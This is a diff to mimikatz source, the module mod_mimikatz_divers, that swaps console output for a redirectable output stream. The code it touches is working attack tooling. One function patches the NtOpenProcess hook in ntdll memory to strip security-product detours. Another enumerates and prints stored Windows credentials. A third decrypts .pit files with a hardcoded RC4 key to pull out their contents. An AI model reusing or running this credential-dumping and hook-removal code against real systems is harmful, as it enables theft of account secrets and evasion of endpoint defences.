@@ -34,15 +34,15 @@ bool mod_mimikatz_divers::nodetour(vector<wstring> * arguments)
 		PBYTE monNTDLLptr = reinterpret_cast<PBYTE>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtOpenProcess"));
 		if(memcmp(monNTDLLptr + 8, monDetouredStub, sizeof(monDetouredStub)) == 0)
 		{
-			wcout << L"Détour trouvé et ";
+			(*outputStream) << L"Détour trouvé et ";
 			if(mod_memory::writeMemory(monNTDLLptr + 8 + sizeof(monDetouredStub) + sizeof(LONG) + *reinterpret_cast<PLONG>(monNTDLLptr + 8 + sizeof(monDetouredStub)), monSysEnterRetn, sizeof(monSysEnterRetn)))
-				wcout << L"patché :)";
+				(*outputStream) << L"patché :)";
 			else
-				wcout << L"NON patché :(";
-			wcout << endl;
+				(*outputStream) << L"NON patché :(";
+			(*outputStream) << endl;
 		}
 		else
-			wcout << L"Détour non trouvé" << endl;
+			(*outputStream) << L"Détour non trouvé" << endl;
 	}
 	return true;
 }
@@ -176,7 +176,7 @@ bool mod_mimikatz_divers::secrets(vector<wstring> * arguments)
 
 	if(CredEnumerate(NULL, flags, &credNb, &pCredential))
 	{
-		wcout << L"Nombre de secrets : " << credNb << endl;
+		(*outputStream) << L"Nombre de secrets : " << credNb << endl;
 		
 		for(DWORD i = 0; i < credNb; i++)
 		{
@@ -208,7 +208,7 @@ bool mod_mimikatz_divers::secrets(vector<wstring> * arguments)
 					type.assign(L"?");
 			}
 
-			wcout << 
+			(*outputStream) << 
 				L"TargetName         : " << pCredential[i]->TargetName << L" / " << (pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>") << endl <<
 				L"Type               : " << type << L" (" << pCredential[i]->Type << L')' << endl <<
 				L"Comment            : " << (pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>") << endl <<
@@ -218,7 +218,7 @@ bool mod_mimikatz_divers::secrets(vector<wstring> * arguments)
 		}
 		CredFree(pCredential);
 	}
-	else wcout << L"CredEnumerate : " << mod_system::getWinError() << endl;
+	else (*outputStream) << L"CredEnumerate : " << mod_system::getWinError() << endl;
 	
 	return true;
 }
@@ -253,11 +253,11 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 
 	if(arguments->size() < 1)
 	{
-		wcout << L"divers:::pitme file.pit [file.rdp]" << endl;
+		(*outputStream) << L"divers:::pitme file.pit [file.rdp]" << endl;
 	}
 	else
 	{
-		wcout << L" * Ouverture en lecture du fichier \'" << arguments->front() << L"\' : ";
+		(*outputStream) << L" * Ouverture en lecture du fichier \'" << arguments->front() << L"\' : ";
 		if(monFichierSource = _wfopen(arguments->front().c_str(), L"rb"))
 		{
 			fseek(monFichierSource, 0, SEEK_END);
@@ -267,40 +267,40 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 			fread(monBuffer, tailleFichierSource, 1, monFichierSource);
 			fclose(monFichierSource);
 
-			wcout << L"OK" << endl << L" * Déchiffrement n°1 : ";
+			(*outputStream) << L"OK" << endl << L" * Déchiffrement n°1 : ";
 			if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource, HARDCODED_KEY, sizeof(HARDCODED_KEY), CALG_RC4))
 			{
-				wcout << L"OK" << endl << L" * Déchiffrement n°2 : ";
+				(*outputStream) << L"OK" << endl << L" * Déchiffrement n°2 : ";
 				if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource - SUBKEY_SIZE, monBuffer + tailleFichierSource - SUBKEY_SIZE, SUBKEY_SIZE, CALG_RC4))
 				{
-					wcout << L"OK" << endl << L" * En-tête : ";
+					(*outputStream) << L"OK" << endl << L" * En-tête : ";
 					if(memcmp(monBuffer, HEADER_PIT, sizeof(HEADER_PIT)) == 0)
 					{
-						wcout << L"OK" << endl;
+						(*outputStream) << L"OK" << endl;
 						monBufferData = monBuffer + sizeof(HEADER_PIT);
 						tailleData = tailleFichierSource - sizeof(HEADER_PIT) - SUBKEY_SIZE;
 
 						if(arguments->size() > 1)
 						{
-							wcout << L" * Ouverture en écriture du fichier \'" << arguments->back() << L"\' : ";
+							(*outputStream) << L" * Ouverture en écriture du fichier \'" << arguments->back() << L"\' : ";
 							if(monFichierDestination = _wfopen(arguments->back().c_str(), L"wb"))
 							{
-								wcout << L"OK" << endl;
+								(*outputStream) << L"OK" << endl;
 								fwrite(monBufferData, tailleData, 1, monFichierDestination);
 								fclose(monFichierDestination);
 							}
-							else wcout << L"KO" << endl;
+							else (*outputStream) << L"KO" << endl;
 						}
-						else wcout << L" * Données : " << endl << endl << wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
+						else (*outputStream) << L" * Données : " << endl << endl << wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
 					}
-					else wcout << L"KO - différent de \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
+					else (*outputStream) << L"KO - différent de \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
 				}
-				else wcout << L"KO";
+				else (*outputStream) << L"KO";
 			}
-			else wcout << L"KO";
+			else (*outputStream) << L"KO";
 			delete [] monBuffer;
 		}
-		else wcout << L"KO" << endl;
+		else (*outputStream) << L"KO" << endl;
 	}
 	return true;
 }
